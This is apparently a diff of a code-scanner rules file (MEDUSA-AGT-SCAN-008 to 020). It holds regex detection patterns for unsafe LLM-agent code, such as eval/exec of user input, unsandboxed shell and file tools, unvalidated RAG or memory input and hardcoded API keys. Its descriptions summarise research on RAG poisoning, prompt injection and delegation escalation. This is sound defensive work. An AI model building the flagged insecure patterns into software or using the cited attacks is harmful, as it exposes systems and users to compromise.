+  - (?i)return\s+(?:response|completion|agent_output)\.(?:content|text|message)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: Agent response returned without output validation
+  description: Detects agent responses being returned or used without output validation guards. Missing output guards allow
+    credential leaks, PII exposure, and system prompt leakage in agent responses.
+  remediation: Add output guards to check for credential material, PII, system prompt leakage, and injection success markers.
+    Use CRT architecture with Security Analysis Agent.
+  owasp_llm: LLM02:2025
+  cwe: CWE-200
+- id: MEDUSA-AGT-SCAN-008
+  name: agent-eval-exec-user-input
+  severity: CRITICAL
+  category: agent_security
+  patterns:
+  - (?i)eval\(.*(?:user_input|query|prompt|request).*\)
+  - (?i)exec\(.*(?:user_input|query|prompt|request).*\)
+  - (?i)subprocess\.(?:call|run|Popen)\(.*(?:user_input|query|prompt).*\)
+  file_types:
+  - '*.py'
+  message: Agent executes user-controlled input via eval/exec/subprocess
+  description: Detects direct execution of user-controlled input via eval(), exec(), or subprocess. This is the most critical
+    vulnerability for code injection (Bowers 2025, Shayegani 2023 - SQL injection via agent 60% ASR).
+  remediation: Never eval/exec user input directly. Use parameterized queries, sandboxed execution environments (PentestMCP-style
+    container isolation), and allowlisted tool patterns.
+  owasp_llm: LLM01:2025
+  cwe: CWE-94
+- id: MEDUSA-AGT-SCAN-009
+  name: agent-no-tool-isolation
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)(?:tool|function)_call\s*=.*\n.*(?:os\.|subprocess\.|shutil\.|pathlib\.)
+  - (?i)agent\.(?:execute|run)_tool\(.*\)\s*$
+  file_types:
+  - '*.py'
+  message: Agent tool execution without sandboxing or isolation
+  description: Detects agent tool calls executed without evidence of sandboxing. Ezetta 2025 (PentestMCP) demonstrates that
+    MCP client-host-server isolation prevents system compromise via tool misuse.
+  remediation: Run agent tool executions in isolated containers or sandboxes. Use MCP client-host-server architecture for
+    tool isolation.
+  owasp_llm: LLM06:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-SCAN-010
+  name: agent-no-belief-state-validation
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:memory|state|context|belief)\.(?:update|set|write)\(.*(?:tool_output|api_response|external).*\)
+  - (?i)(?:memory|state)\.(?:add|append|store)\(.*(?:retrieved|fetched|scraped).*\)
+  file_types:
+  - '*.py'
+  message: Agent belief state updated from external data without validation
+  description: Detects agent memory/state being updated directly from external data sources without validation. Shi 2025 identifies
+    Source Poisoning attacks that corrupt agent belief states via adversarial external data.
+  remediation: Validate external data before updating agent state. Implement B-I-P Belief trust scoring. Use MemGuard-style
+    failure-aware exemplars.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-SCAN-011
+  name: no-model-extraction-defense
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:logits?|probabilities|confidence|softmax)\s*=.*(?:model|agent|llm)\.(?:predict|forward|generate)
+  - (?i)return.*(?:logits?|probabilities|output_distribution)
+  file_types:
+  - '*.py'
+  message: Model logits/probabilities exposed without extraction defense
+  description: Detects model output distributions being returned without protection. Atli 2020 shows Knockoff Nets achieve
+    0.97x model performance recovery. Without OOD detection, model IP is vulnerable.
+  remediation: Implement OOD query detection (Atli 2020 - 99% detection accuracy). Do not expose raw logits/probabilities.
+    Add rate limiting and query pattern monitoring.
+  owasp_llm: LLM10:2025
+  cwe: CWE-200
+- id: MEDUSA-AGT-SCAN-012
+  name: agent-no-hallucination-check
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:agent|llm|model)\.(?:generate|complete|chat)\(.{0,100}\n.*(?:execute|run|apply|deploy)\(
+  file_types:
+  - '*.py'
+  message: Agent output used in execution without hallucination verification
+  description: Detects agent output being used for execution without hallucination checking. CRAKEN (Shao 2025) and D-CIPHER
+    (Udeshi 2025) show significant improvement with hallucination graders.
+  remediation: Implement hallucination grading (CRAKEN-style HallucinationGrader) before executing agent-generated plans or
+    code.
+  owasp_llm: LLM02:2025
+  cwe: CWE-1039
+- id: MEDUSA-AGT-SCAN-013
+  name: agent-rag-no-retrieval-sanitization
+  severity: HIGH
+  category: rag_security
+  patterns:
+  - (?i)(?:retrieved|chunks|documents?)\s*=\s*(?:vectordb|chroma|pinecone|weaviate|qdrant|faiss)\.
+  - (?i)(?:retriever|search)\.(?:query|search|similarity_search)\(.*\)\s*\n.*(?:prompt|context)
+  file_types:
+  - '*.py'
+  message: RAG retrieval results passed to agent without sanitization
+  description: Detects RAG patterns where retrieved documents feed directly into agent context without sanitization. Liu 2025
+    reports PoisonedRAG achieves 90% ASR and BadRAG 74.6% rejection rate via knowledge base poisoning.
+  remediation: Sanitize retrieved content before adding to agent context. Implement content verification and anomaly detection
+    on retrieved documents.
+  owasp_llm: LLM08:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-SCAN-014
+  name: no-crt-architecture
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:code_agent|coding_agent|coder)\s*=.*Agent\(
+  file_types:
+  - '*.py'
+  message: Code generation agent without Coder-Reviewer-Tester architecture
+  description: Detects code generation agent instantiation without evidence of a CRT (Coder-Reviewer-Tester) pipeline. Bowers
+    2025 shows CRT reduces code injection ASR from 100% to 1.42%.
+  remediation: Implement CRT architecture with Security Analysis Agent for code review. Test generated code in sandboxed environment
+    before execution.
+  owasp_llm: LLM02:2025
+  cwe: CWE-94
+- id: MEDUSA-AGT-SCAN-015
+  name: no-aegis-defense-pipeline
+  severity: MEDIUM
+  category: agent_security
+  patterns:
+  - (?i)(?:multimodal_agent|vision_agent|image_agent)\s*=.*Agent\(
+  file_types:
+  - '*.py'
+  message: Multimodal agent without AegisAgent-style defense pipeline
+  description: Detects multimodal agent instantiation without defense pipeline. Wang 2025 (AegisAgent) achieves 85% detection
+    accuracy and 30% ASR reduction against multimodal prompt injection.
+  remediation: Implement AegisAgent-style Input Sanitizer + Consistency Verifier + Robust Reasoner pipeline for multimodal
+    agent inputs.
+  owasp_llm: LLM01:2025
+  cwe: CWE-1039
+- id: MEDUSA-AGT-SCAN-016
+  name: hardcoded-api-key-in-agent
+  severity: CRITICAL
+  category: agent_security
+  patterns:
+  - (?i)api_key\s*=\s*['"](?:sk-[a-zA-Z0-9]{32,}|sk-ant-[a-zA-Z0-9]{32,})['"]
+  - (?i)(?:openai|anthropic|cohere)_api_key\s*=\s*['"][A-Za-z0-9_\-]{20,}['"]
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: Hardcoded API key found in agent code
+  description: Detects hardcoded API keys (OpenAI sk-, Anthropic sk-ant-) in source code. Enables credential theft and unauthorized
+    model access.
+  remediation: Store API keys in environment variables or secret managers. Never hardcode credentials in source files.
+  owasp_llm: LLM06:2025
+  cwe: CWE-798
+- id: MEDUSA-AGT-SCAN-017
+  name: dangerous-code-execution-enabled
+  severity: CRITICAL
+  category: agent_security
+  patterns:
+  - (?i)Python(?:Ast)?REPL(?:Tool)?\s*\([^)]*allow_dangerous_code\s*=\s*True
+  - (?i)code_execution_config\s*=\s*\{[^}]*['"]use_docker['"]\s*:\s*False
+  file_types:
+  - '*.py'
+  message: Agent configured for dangerous unsandboxed code execution
+  description: Detects LangChain PythonREPL with allow_dangerous_code=True or AutoGen with Docker disabled. Allows agent-generated
+    code to execute directly on host without isolation.
+  remediation: Always sandbox code execution (Docker containers, gVisor, PentestMCP-style isolation). Never set allow_dangerous_code=True
+    in production.
+  owasp_llm: LLM01:2025
+  cwe: CWE-250
+- id: MEDUSA-AGT-SCAN-018
+  name: unrestricted-agent-delegation
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)allow_delegation\s*=\s*True
+  - (?i)can_delegate\s*=\s*True
+  file_types:
+  - '*.py'
+  message: Agent delegation enabled without restrictions
+  description: Detects CrewAI/similar frameworks with unrestricted delegation. Krawiecka 2025 shows Unsafe Delegation Escalation
+    where sub-agents gain elevated privileges via implicit permission inheritance.
+  remediation: Restrict delegation with explicit permission boundaries. Implement B-I-P safety margin checks on delegated
+    tasks.
+  owasp_llm: LLM01:2025
+  cwe: CWE-269
+- id: MEDUSA-AGT-SCAN-019
+  name: shell-tool-direct-usage
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)ShellTool\s*\(
+  - (?i)BashProcess\s*\(
+  - (?i)TerminalTool\s*\(
+  file_types:
+  - '*.py'
+  message: Direct shell/terminal tool given to agent without isolation
+  description: Detects agents given direct shell access tools (LangChain ShellTool, BashProcess). Enables arbitrary command
+    execution without sandboxing.
+  remediation: Use containerized tool execution (PentestMCP-style isolation). Restrict shell access with allowlisted commands
+    only.
+  owasp_llm: LLM01:2025
+  cwe: CWE-78
+- id: MEDUSA-AGT-SCAN-020
+  name: unrestricted-file-toolkit
+  severity: HIGH
+  category: agent_security
+  patterns:
+  - (?i)FileManagementToolkit\s*\((?![^)]*root_dir)
+  file_types:
+  - '*.py'
+  message: FileManagementToolkit used without root_dir restriction
+  description: Detects LangChain FileManagementToolkit instantiated without root_dir parameter. Without path restriction,
+    agent can read/write/delete any file on the filesystem.
+  remediation: Always specify root_dir parameter to restrict file operations to a sandboxed directory.
+  owasp_llm: LLM01:2025
+  cwe: CWE-552
